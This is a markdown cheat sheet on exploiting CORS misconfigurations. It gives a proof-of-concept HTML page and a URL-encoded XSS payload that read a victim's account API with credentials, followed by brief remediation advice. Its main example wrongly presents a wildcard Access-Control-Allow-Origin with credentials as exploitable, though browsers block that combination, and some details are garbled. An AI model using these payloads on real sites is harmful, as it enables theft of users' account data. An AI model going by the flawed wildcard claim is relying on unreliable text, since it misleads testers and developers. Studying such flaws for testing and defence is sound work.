# CORS

## Information

Cross-Origin Resource Sharing(CORS) is a mechanism that enables web browsers to perform cross-domain requests using the XMLHttpRequest API in a controlled manner.

OWASP TOP 10: A6-Security Misconfiguration vulnerability

## Detect CORS misconfiguration     

Identify Response **Access-Control-Allow-Origin** Header 

1. CORS misconfiguration using wildcards such as (*)
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: * 
```
2. Origin with Other Domain.
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: vulnerablesite.com 
```

**Example:** Web client sends a request to get a resource from a different domain, Consider the below Request
```
GET /api/account_detaild HTTP/1.1
Host: www.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: vulnerablesite.com
Connection: keep-alive
```
The web client inform to server its source domain using the HTTP request header "Origin". 

You get below response with the **Access-Control-Allow-Origin** header setting. 
```
HTTP/1.1 200 OK
Date: Sat, 16 May 2020 00:2:03 GMT
Connection: Keep-Alive
Content-Type: application/xml
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: * 
```
The header is configured with a wildcard(*). It means **Any domain** can access the resources.

## POC - Exploite Code
1. cors.html is the exploit code to exploit misconfigured CORS

```javascript
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://www.website.com/api/account_detaild", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS - POC Exploit </h2>
      <button type="button" onclick="cors()">Exploit CORS</button>
   </body>
</html>
```

2. You can exploit this misconfiguration CORS using XSS so just replace **payload alert(document.domain)** 
    
    - XSS Payload for Exploite CORS:
```javascript
<script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200)alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.website.com/api/account_detaild",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
```


## Remediation

* Allow only **Trusted domains** `Access-Control-Allow-Origin: <origin>` header.
  E.x: Access-Control-Allow-Origin: https://website.com

* Avoid whitelisting null `Access-Control-Allow-Origin: null`



## Refrence

- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

- https://hackerone.com/reports/470298 

- https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
